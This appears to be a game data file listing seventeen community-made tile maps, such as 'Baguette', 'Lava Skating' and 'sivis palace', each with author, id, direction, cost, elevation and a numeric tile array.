maps.push({name="Baguette",author="Spy Monkeh",id="#1694390049",direction="right",cost=167,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,53,53,53,53,0,0,0,0,0,0,0,0,0,0,0,0,93,94,0,53,55,55,55,55,53,0,0,0,0,0,0,0,0,0,0,0,5,5,92,55,55,55,55,55,53,53,0,0,0,0,0,0,0,0,0,0,5,5,92,55,55,55,55,55,55,55,53,0,0,0,0,0,0,0,0,0,5,5,92,55,55,55,54,55,55,55,55,53,0,0,0,0,0,0,0,0,0,0,0,55,54,54,55,55,55,54,55,55,53,0,0,0,0,0,0,0,0,0,0,0,55,55,55,55,54,55,55,55,55,53,0,0,0,0,0,0,0,0,0,0,0,55,54,54,55,55,55,55,55,55,53,0,0,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,54,55,55,53,0,0,0,0,0,0,0,0,0,0,0,55,55,55,55,54,55,55,55,55,53,0,0,0,0,0,0,0,0,0,0,0,55,54,54,55,55,55,55,55,53,0,0,0,0,0,0,0,0,0,0,0,0,55,55,55,55,55,55,55,55,53,0,0,0,0,0,0,0,0,0,0,0,0,55,55,55,55,54,55,55,53,0,0,0,0,0,0,0,0,0,0,0,0,0,55,54,54,55,55,55,53,0,0,0,0,0,0,0,0,0,0,0,0,0,0,55,55,55,55,55,53,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,53,55,55,53,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,5,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,5,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Earthquake v2",author="sivi",id="#1694434523",direction="right",cost=473,elevation=0,map=[0,0,0,0,0,0,0,1,107,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,7,148,9998,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,7,148,7,148,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,7,148,7,148,7,1,0,0,1,1,1,1,1,1,0,0,0,1,1,7,148,7,148,7,148,1,0,1,1,7,148,7,148,2,0,0,1,1,7,148,7,148,7,148,1,1,1,1,7,148,7,148,7,2,0,0,1,7,148,7,148,7,148,1,1,1,1,7,148,7,148,7,148,107,0,0,1,148,7,148,7,148,1,1,1,1,7,148,7,148,7,148,1,1,0,0,1,7,148,7,148,1,1,1,1,1,148,7,148,7,148,1,1,0,0,0,1,148,7,148,7,1,93,93,93,1,7,148,7,148,1,1,0,0,0,0,1,7,148,7,148,1,110,110,110,1,148,7,148,7,1,0,0,0,0,0,1,148,7,148,7,1,94,110,94,1,7,148,7,148,1,0,0,0,0,0,1,7,148,7,148,1,1,110,1,1,148,7,148,7,1,0,0,0,0,0,1,148,7,148,7,148,1,110,1,148,7,148,7,148,1,0,0,0,0,0,1,1,148,7,148,7,148,7,148,7,148,7,148,7,1,0,0,0,0,0,0,1,7,148,7,148,7,148,7,148,7,148,7,1,1,0,0,0,0,0,0,1,1,7,148,7,148,7,148,7,148,7,1,1,0,0,0,0,0,0,0,0,1,1,7,148,7,148,7,148,7,1,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Finale Elevator",author="NyaaaDoge",id="#1694462225",direction="forward",cost=176,elevation=19,map=[0,0,0,0,0,0,0,0,5,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,7,7,7,7,7,7,7,90,0,0,0,0,0,0,0,0,0,0,5,5,90,9,9,9,9,9,7,5,5,0,0,0,0,0,0,0,0,5,5,5,7,9,30,30,30,9,7,5,5,5,0,0,0,0,0,0,94,5,5,5,7,9,30,152,30,9,7,5,90,5,94,0,0,0,0,0,0,90,5,5,7,9,187,44,0,90,7,5,5,5,0,0,0,0,0,0,0,0,5,5,7,9,185,185,185,9,7,5,5,0,0,0,0,0,0,0,0,0,0,90,7,7,185,185,185,7,7,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,185,185,185,5,5,90,0,0,0,0,0,0,0,0,0,0,0,1,58,58,24,24,24,58,58,1,0,0,0,0,0,0,0,0,0,0,0,0,1,93,24,90,24,93,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,124,124,124,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,124,124,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,89,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="fuzz",author="tylxr",id="#1694485537",direction="left",cost=213,elevation=1,map=[0,0,0,0,0,0,0,23,23,23,23,23,23,0,0,0,2,2,0,0,0,0,0,0,0,0,6,5,5,5,5,6,6,0,0,0,5,5,0,0,0,0,0,0,0,0,6,5,5,0,0,135,135,0,0,0,5,5,0,0,0,0,0,0,0,0,6,6,6,0,0,135,135,0,0,0,6,6,0,0,0,0,0,0,0,76,76,76,76,76,0,135,135,0,0,0,6,6,0,0,0,0,0,0,0,6,6,76,6,6,0,135,135,0,0,0,6,6,0,0,0,0,0,0,0,76,76,76,76,76,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,6,6,76,6,6,0,135,135,0,0,0,6,6,0,0,2,6,6,0,0,76,76,76,76,76,0,6,6,0,0,0,6,6,0,0,2,6,6,0,0,6,6,76,6,6,0,6,6,0,0,0,0,0,0,0,0,6,6,0,0,76,76,76,76,76,0,9,9,0,0,0,6,6,0,0,0,6,6,0,0,6,6,6,6,6,0,9,9,0,0,0,8,8,0,0,0,6,6,0,0,0,0,0,0,0,0,12,12,23,23,23,9,9,0,0,0,6,6,6,6,6,6,6,6,0,0,12,12,23,23,23,11,11,0,0,0,6,6,6,6,6,6,6,6,0,0,12,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Lowgrav Training",author="NyaaaDoge",id="#1694499469",direction="forward",cost=195,elevation=19,map=[0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,5,5,0,1,1,1,1,1,1,0,0,1,132,132,1,0,0,0,0,0,5,5,1,124,124,8,54,124,124,1,0,1,99,100,1,0,0,0,0,0,5,5,1,13,130,130,130,130,51,1,1,1,96,96,1,1,0,0,0,0,5,105,196,45,130,130,130,130,64,124,95,124,124,124,95,93,1,0,0,0,5,105,196,105,130,130,130,130,58,124,95,124,124,124,95,97,1,0,0,0,1,98,1,19,130,130,130,130,124,1,1,1,124,124,1,1,0,0,0,0,1,105,1,124,57,14,60,124,124,1,0,0,24,24,0,0,0,0,0,0,1,131,1,1,1,1,1,1,1,0,0,0,24,24,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0]});
maps.push({name="Take it easy",author="NyaaaDoge",id="#1694499511",direction="forward",cost=281,elevation=-3,map=[1,2,2,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,90,1,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,1,114,114,1,0,154,0,0,1,94,13,12,12,12,90,1,0,0,0,0,1,114,114,1,153,5,145,0,1,13,13,12,12,12,12,1,0,0,0,0,1,95,1,1,1,1,1,1,1,13,13,0,0,12,12,1,0,0,0,0,1,54,54,54,95,91,90,54,13,13,75,77,0,11,11,1,0,0,0,0,1,54,54,54,95,91,90,54,13,75,75,77,0,11,11,1,0,0,0,0,0,0,0,0,1,1,1,1,1,77,77,0,0,11,11,1,0,0,0,0,0,0,0,0,0,0,77,77,0,0,0,0,1,95,95,1,1,1,0,0,145,38,185,14,145,0,0,0,0,0,0,0,1,91,91,11,12,90,1,0,145,38,185,14,145,0,0,0,0,0,0,0,1,88,11,11,12,12,1,0,145,38,185,14,145,0,0,0,0,0,0,0,0,1,1,0,12,12,1,0,145,38,185,0,0,0,145,12,93,0,0,0,0,0,0,0,12,12,1,0,145,38,185,14,145,0,0,0,0,0,0,67,67,0,0,0,11,11,1,0,145,38,185,14,145,93,0,0,0,0,67,65,65,11,91,91,11,11,1,0,145,38,185,14,0,145,145,0,145,0,67,65,11,11,91,91,11,90,1,0,145,38,185,145,14,14,14,0,13,0,0,11,11,1,1,1,1,1,0,0,145,38,185,185,185,185,185,185,185,0,0,11,11,1,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,0,0,11,90,1,0,0,0,0,0,0,0,0,145,145,145,145,145,145,145,0,0,2,2,1,0,0,0,0,0,0]});
maps.push({name="U gonna finish that",author="Spy Monkeh",id="#1694557968",direction="right",cost=188,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,52,52,0,52,52,52,52,52,0,0,0,0,0,0,0,0,0,5,5,52,55,52,0,0,52,55,55,55,52,0,0,0,0,0,0,0,0,93,94,52,55,52,0,0,0,52,55,55,55,52,0,0,0,0,0,0,0,5,5,52,55,52,0,0,0,52,55,55,55,52,0,0,0,0,0,0,0,5,5,55,55,54,52,52,0,52,55,55,55,55,52,65,65,5,0,0,0,5,92,55,54,54,55,55,52,55,54,55,55,55,54,65,65,5,0,0,0,0,55,55,54,55,55,54,55,54,55,54,54,54,55,65,65,5,2,0,0,0,52,55,54,55,54,54,55,54,55,55,55,55,55,65,65,5,2,0,0,0,52,54,55,55,54,55,55,54,55,55,55,55,55,65,65,5,0,0,0,0,52,54,55,55,54,55,55,55,54,55,55,55,52,65,65,5,0,0,0,0,0,52,55,55,54,55,55,55,55,54,54,52,0,0,0,0,0,0,0,0,0,0,52,55,55,54,55,55,55,55,52,0,0,0,0,0,0,0,0,0,0,0,0,52,52,52,52,52,52,52,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="baguette factory v3",author="alli",id="#1694589389",direction="left",cost=304,elevation=-1,map=[0,0,0,0,0,0,0,1,1,1,1,6,2,2,1,1,1,1,0,0,1,1,1,1,1,1,1,124,65,67,6,6,6,6,6,67,65,124,1,0,88,5,5,5,5,65,93,111,1,0,9998,9998,9998,9998,9998,0,1,1,0,0,2,5,5,5,5,65,93,111,111,148,9998,7,7,7,9998,0,111,1,0,0,2,5,5,5,5,65,93,111,1,0,9998,9998,9998,9998,9998,0,1,1,0,0,1,1,189,0,0,1,1,124,65,67,6,6,6,6,6,67,65,124,1,0,0,1,5,176,170,1,0,1,1,0,9998,9998,9998,9998,9998,0,1,1,0,0,0,1,9,175,0,1,0,1,112,148,9998,7,7,7,9998,0,112,1,0,0,0,1,188,0,0,1,0,0,1,0,9998,9998,9998,9998,9998,0,1,0,0,0,0,1,0,174,0,1,1,1,1,0,6,6,6,6,6,0,1,1,1,0,0,1,187,13,189,1,90,13,13,0,9998,9998,9998,9998,9998,0,13,13,90,1,0,1,0,177,5,113,13,13,13,148,9998,7,7,7,9998,0,13,13,13,1,0,1,170,173,13,113,13,13,13,0,9998,9998,9998,9998,9998,0,13,13,13,1,0,1,0,0,188,113,13,13,13,0,6,6,6,6,6,0,13,13,13,1,0,0,1,1,1,1,1,1,1,1,1,106,106,106,1,1,113,113,113,1,0,0,0,0,0,0,0,0,0,0,1,107,107,107,1,1,112,112,112,1,0,0,0,0,0,0,0,0,0,0,1,108,108,108,109,110,111,111,111,1,0,0,0,0,0,0,0,0,0,0,1,108,108,108,109,110,111,111,111,1,0,0,0,0,0,0,0,0,0,0,1,90,108,108,109,110,111,111,90,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,0]});
maps.push({name="cycle of rebirth",author="alli",id="#1694589590",direction="forward",cost=264,elevation=0,map=[0,0,0,0,0,0,0,1,105,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,9998,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,5,5,5,1,1,1,1,1,1,0,0,0,0,1,187,5,0,27,5,0,0,5,0,0,5,148,0,0,0,1,0,0,0,1,170,173,0,27,174,0,0,175,0,0,176,6,0,177,170,1,0,0,0,1,0,0,0,27,170,0,0,170,0,0,170,188,0,5,189,1,0,0,0,1,28,28,28,1,1,1,1,1,1,1,1,1,0,148,6,1,0,0,0,1,170,193,5,1,0,0,0,0,0,0,0,1,0,178,170,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1,148,5,148,1,0,0,0,1,29,29,29,1,0,0,0,0,0,0,0,1,6,145,6,1,0,0,0,1,170,192,5,1,0,0,0,0,0,0,0,1,170,179,188,1,0,0,0,1,189,0,189,1,1,1,1,1,1,1,1,1,148,5,189,1,0,0,0,1,12,148,10,1,170,1,0,5,0,189,5,148,6,148,5,1,0,0,0,1,0,191,170,1,190,1,0,182,0,6,181,5,145,180,170,1,0,0,0,1,187,5,0,1,5,1,0,170,5,148,170,0,0,5,186,1,0,0,0,1,115,115,115,1,1,1,5,5,5,1,1,1,1,1,1,0,0,0,0,1,93,115,93,1,0,1,5,5,5,1,0,0,0,0,0,0,0,0,0,1,93,115,93,1,0,1,132,5,89,1,0,0,0,0,0,0,0,0,0,1,115,131,115,1,0,1,5,5,9998,1,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,1,105,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="one must imagine",author="alli",id="#1694593092",direction="right",cost=253,elevation=-5,map=[0,0,0,0,0,0,0,1,1,1,1,1,2,2,1,1,1,1,1,0,0,0,0,0,0,0,1,124,75,77,0,0,14,14,0,0,77,75,124,1,0,0,0,0,0,0,0,1,1,189,0,0,34,34,0,0,189,1,1,0,0,0,0,0,0,0,0,0,1,20,0,0,34,34,0,148,20,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,34,34,0,0,0,1,1,0,0,0,0,0,0,0,1,124,75,77,34,0,14,14,0,0,77,75,124,1,0,0,0,0,0,0,0,1,1,1,114,1,114,114,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,94,1,114,114,114,90,1,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,88,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,114,114,1,1,1,1,0,0,0,0,0,0,0,1,1,1,1,0,0,0,34,34,0,1,90,1,0,0,0,0,0,0,1,117,97,117,13,9,9,9,185,185,9,96,109,2,0,0,0,0,0,0,1,88,117,117,13,9,9,9,185,185,9,96,109,2,0,0,0,0,0,1,1,117,117,117,1,30,0,0,185,185,0,1,90,1,0,0,0,0,1,99,1,88,117,90,1,31,32,33,34,34,0,1,1,1,0,0,0,189,1,118,1,1,98,1,1,1,1,1,114,114,1,1,93,189,0,0,0,24,1,118,18,18,9998,17,9998,16,9998,15,9998,14,9998,13,12,14,0,0,169,173,1,118,18,18,9998,17,9998,16,9998,15,9998,14,9998,13,9998,174,0,0,0,176,0,1,0,0,17,17,0,0,0,0,0,0,0,0,169,175,0,0,0,15,186,0,0,0,37,37,0,0,0,0,0,0,0,172,145,11]});
maps.push({name="esgaroth",author="alli",id="#1694594748",direction="left",cost=225,elevation=-3,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,115,115,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,199,115,115,1,1,93,117,199,0,0,0,0,0,0,0,0,0,0,0,0,199,115,115,1,1,93,117,199,0,0,0,0,0,0,0,0,12,12,12,0,199,115,115,1,1,93,117,199,0,0,0,153,0,0,0,0,32,32,32,0,199,115,115,1,1,117,1,1,0,0,157,10,145,0,0,0,90,32,90,0,199,115,115,1,12,195,12,0,0,0,0,154,0,0,0,0,32,32,32,0,1,1,115,1,188,0,188,0,0,0,0,0,0,0,0,0,32,32,32,12,13,14,15,1,12,12,0,0,0,0,0,0,0,0,0,0,90,32,32,12,9998,12,12,0,32,32,0,0,0,0,0,0,0,0,0,0,32,32,32,12,12,12,12,183,2,32,0,0,0,0,0,0,0,0,0,0,32,32,32,0,1,1,1,183,2,32,0,0,0,0,0,0,0,0,0,0,90,32,32,0,1,97,1,183,32,32,0,0,0,0,0,0,0,0,0,0,32,32,32,0,199,116,1,183,90,32,0,0,0,0,0,0,0,0,0,0,32,32,32,0,199,116,1,12,32,32,12,33,34,183,183,183,34,34,33,12,32,32,32,0,1,116,1,33,32,32,12,33,34,34,183,183,34,34,33,12,32,32,32,0,116,116,1,34,90,32,12,33,34,34,183,183,183,34,33,12,32,32,32,0,1,116,1,35,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,0,199,116,116,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0]});
maps.push({name="I need noclip",author="TheShy",id="#1694615576",direction="forward",cost=658,elevation=0,map=[140,140,25,25,25,25,25,25,25,2,2,25,25,25,25,25,25,25,140,140,140,140,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,140,140,187,30,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,30,186,187,30,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,30,186,187,32,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,32,186,187,32,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,32,186,187,34,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,34,186,187,34,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,34,186,187,36,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,36,186,187,36,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,36,186,187,38,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,38,186,187,38,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,38,186,187,40,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,40,186,187,40,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,40,186,187,42,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,42,186,187,42,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,42,186,187,44,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,44,186,0,100,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,100,0,140,140,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,140,140,140,140,25,25,25,25,25,25,25,2,2,25,25,25,25,25,25,25,140,140]});
maps.push({name="Unstable Bridge",author="sivi",id="#1694625678",direction="forward",cost=452,elevation=0,map=[1,1,1,1,1,1,1,1,120,2,2,120,1,1,1,1,1,1,1,1,1,90,14,14,90,14,14,90,20,20,20,20,90,14,14,90,14,14,90,1,1,14,14,14,14,14,14,9998,9998,9998,9998,9998,9998,14,14,14,14,14,14,1,1,90,14,9,153,1,187,15,91,91,91,91,15,186,1,154,9,14,90,1,1,14,14,188,0,44,187,15,91,91,91,91,15,186,44,0,188,14,14,1,1,75,75,77,0,90,187,15,91,91,91,91,15,186,90,0,77,75,75,1,1,14,14,0,0,44,187,15,91,91,91,91,15,186,44,0,0,14,14,1,1,90,85,0,0,1,187,15,91,91,91,91,15,186,1,0,0,85,90,1,1,14,14,0,0,44,187,15,91,91,91,91,15,186,44,0,0,14,14,1,1,75,75,77,0,90,187,15,91,91,91,91,15,186,90,0,77,75,75,1,1,14,14,0,0,44,187,15,91,91,91,91,15,186,44,0,0,14,14,1,1,90,85,0,0,1,187,15,91,91,91,91,15,186,1,0,0,85,90,1,1,14,14,0,0,44,187,15,91,91,91,91,15,186,44,0,0,14,14,1,1,75,75,77,0,90,187,15,91,91,91,91,15,186,90,0,77,75,75,1,1,14,14,0,44,9998,187,15,91,91,91,91,15,186,9998,44,0,14,14,1,1,90,14,0,188,1,44,1,9998,9998,9998,9998,1,44,1,188,0,14,90,1,1,14,14,15,16,17,18,119,120,120,120,120,119,18,17,16,15,14,14,1,1,14,14,15,16,17,18,119,120,120,120,120,119,18,17,16,15,14,14,1,1,3,5,5,5,5,93,1,95,95,95,95,1,93,5,5,5,5,3,1,1,1,1,1,1,1,1,1,120,2,2,120,1,1,1,1,1,1,1,1]});
maps.push({name="look down",author="alli",id="#1694682769",direction="forward",cost=251,elevation=0,map=[153,6,186,0,1,1,1,1,114,2,2,1,1,1,1,1,0,0,0,0,154,13,186,1,24,14,14,14,14,14,9998,14,0,0,0,24,1,0,0,0,0,0,1,23,14,14,14,90,14,14,14,0,0,0,0,14,23,1,0,0,0,1,24,14,14,14,0,0,0,0,0,0,0,0,0,14,93,23,1,0,1,22,14,14,90,0,0,0,0,0,0,0,0,0,0,0,14,93,24,1,1,14,14,14,0,0,0,0,145,145,145,145,145,145,145,0,0,14,93,1,1,14,14,0,0,0,145,7,7,7,7,7,7,7,7,0,0,14,14,1,1,14,90,0,0,0,14,184,184,184,184,184,184,184,184,0,0,0,14,1,1,14,14,0,0,0,0,0,0,0,0,0,0,0,14,145,0,0,0,1,1,14,14,184,184,184,184,184,14,0,0,0,0,0,184,7,0,0,0,1,1,14,14,7,7,7,7,7,145,0,0,0,0,0,184,7,145,0,0,1,1,14,14,188,188,188,188,0,0,0,0,0,0,0,184,7,145,0,0,1,1,14,14,0,0,0,0,0,0,7,186,0,0,0,184,7,145,0,0,1,1,96,96,1,0,0,0,0,0,184,184,184,184,14,184,7,145,0,0,1,1,114,114,1,0,0,0,0,0,184,7,7,7,145,0,0,0,0,0,1,1,114,114,114,1,0,0,187,7,184,188,145,145,0,0,0,0,0,24,1,0,1,114,114,114,1,0,187,7,184,0,0,0,0,0,0,0,23,1,0,0,0,1,114,114,114,14,90,14,14,14,14,90,14,14,14,24,1,0,0,0,0,0,1,114,114,97,14,14,14,9998,14,14,14,14,24,1,0,0,0,0,0,0,0,1,1,1,1,114,2,2,1,1,1,1,1,0,0,0,0]});
maps.push({name="galaxy brain",author="alli",id="#1694684295",direction="forward",cost=300,elevation=0,map=[0,1,1,114,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,14,90,14,14,9998,90,94,1,114,114,95,14,90,14,132,14,90,94,1,1,14,14,14,14,14,14,14,1,114,114,95,14,14,14,14,14,14,14,1,1,14,14,14,14,14,14,14,1,114,114,1,14,14,14,14,14,14,14,1,1,0,0,0,0,0,34,0,1,114,114,1,0,0,0,0,0,183,0,1,1,0,0,0,0,0,34,0,1,114,114,1,0,0,0,0,0,183,0,1,1,0,0,0,0,0,34,0,1,114,114,1,0,0,0,0,0,183,0,1,1,0,34,34,34,34,34,0,1,114,114,1,0,183,183,183,183,183,0,1,1,0,34,0,0,0,0,0,1,114,114,1,0,183,0,0,0,0,0,1,1,0,34,0,153,13,154,0,1,114,114,1,0,183,0,0,0,0,0,1,1,0,34,0,0,188,0,0,1,114,114,1,0,183,0,0,0,0,0,1,1,0,34,34,34,0,0,0,1,114,114,1,0,183,183,183,0,0,0,1,1,0,0,0,34,34,34,34,1,114,114,1,0,0,0,183,183,183,183,1,1,0,0,0,0,0,0,34,1,114,114,1,0,0,0,0,0,0,183,1,1,0,0,0,0,0,0,34,1,114,114,1,0,0,0,0,0,0,183,1,1,0,0,0,0,0,0,34,1,114,114,1,0,0,0,0,1,0,183,1,1,14,90,14,14,14,90,14,1,114,114,1,14,90,14,14,199,114,93,1,1,14,14,14,14,14,14,14,1,114,114,95,14,14,14,134,199,114,93,1,1,14,14,14,131,14,14,14,1,114,114,95,14,14,14,9998,199,114,133,1,0,1,1,1,1,1,1,1,1,1,1,1,1,114,2,2,1,1,1,0]});
maps.push({name="sivis palace",author="alli",id="#1694687434",direction="forward",cost=425,elevation=-11,map=[0,0,0,0,0,0,0,0,16,2,2,16,0,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,16,16,16,16,19,0,0,21,24,0,0,0,0,0,12,65,12,12,16,16,16,16,16,16,19,21,21,23,23,24,0,0,0,12,65,65,65,67,161,161,161,161,161,161,161,161,161,161,16,23,24,0,12,65,65,65,65,67,161,161,161,161,161,161,161,161,161,161,16,21,24,0,0,67,65,65,65,67,161,161,161,161,161,161,161,161,161,161,16,21,23,0,0,67,65,65,65,65,67,161,19,19,20,20,22,22,67,16,16,16,21,24,67,65,65,65,65,65,12,19,0,0,0,0,0,1,65,1,16,16,20,22,0,67,65,65,65,12,0,0,0,0,0,0,0,1,124,1,16,16,93,22,0,67,65,65,65,12,0,0,0,0,0,0,0,0,1,24,16,16,93,22,0,0,67,65,65,12,0,0,0,0,0,0,0,0,0,0,90,16,93,22,0,0,0,67,67,8,0,0,0,0,0,0,0,0,0,16,16,16,21,22,0,0,67,65,65,65,8,0,0,0,0,0,0,0,12,12,16,16,94,22,0,0,67,65,65,65,65,8,0,0,0,0,0,8,12,90,12,16,94,22,0,0,0,8,65,65,65,65,8,67,67,0,8,8,8,12,12,12,16,22,0,0,0,0,8,65,65,65,67,65,65,5,5,8,8,8,12,12,22,0,0,0,0,0,67,65,65,67,65,65,65,5,5,5,8,8,8,12,22,0,0,0,0,0,0,67,67,65,65,65,5,5,90,5,5,8,8,22,0,0,0,0,0,0,0,0,67,65,65,5,5,5,5,5,5,8,20,0,0,0,0,0,0,0,0,0,0,5,5,5,2,2,89,5,5,17,0,0,0,0]});
maps.push({name="Lava Skating",author="sivi",id="#1694696508",direction="right",cost=538,elevation=10,map=[1,1,1,1,2,2,114,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,9998,14,14,11,11,11,11,11,11,11,11,12,12,12,90,1,1,1,1,0,14,90,14,135,135,135,135,135,135,135,135,12,12,93,93,1,1,124,77,0,34,34,34,135,135,135,135,135,135,135,135,90,12,93,93,1,1,124,77,0,34,34,90,135,135,135,135,135,135,135,135,11,12,12,12,1,1,124,77,0,34,34,34,135,135,135,135,135,135,135,135,135,11,90,12,1,1,1,1,0,14,14,14,135,135,135,135,135,135,135,135,135,135,135,11,1,1,153,1,0,90,14,14,135,135,135,135,135,135,135,135,135,135,135,11,1,1,12,1,0,14,14,14,135,135,135,135,135,135,135,135,135,135,135,11,1,1,154,1,0,14,14,90,135,135,135,135,135,135,135,135,135,135,135,11,1,1,1,1,0,14,14,14,135,135,135,135,135,135,135,135,135,135,135,11,1,1,124,77,0,34,34,34,135,135,135,135,135,135,135,135,135,135,135,11,1,1,124,77,0,34,90,34,135,135,135,135,135,135,135,135,135,135,24,90,1,1,124,77,0,34,34,34,135,135,135,135,135,135,135,135,135,24,24,24,1,1,1,1,0,14,14,14,135,135,135,135,135,135,135,135,135,24,24,94,1,1,0,1,14,90,14,14,13,12,12,12,12,11,135,135,23,24,90,24,1,1,0,1,94,14,14,14,15,16,17,18,19,20,21,22,23,24,24,9998,2,1,0,1,88,14,90,14,15,16,17,18,19,20,21,22,23,24,24,24,2,1,0,1,90,14,14,14,15,16,17,18,19,20,21,22,23,24,90,24,124,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
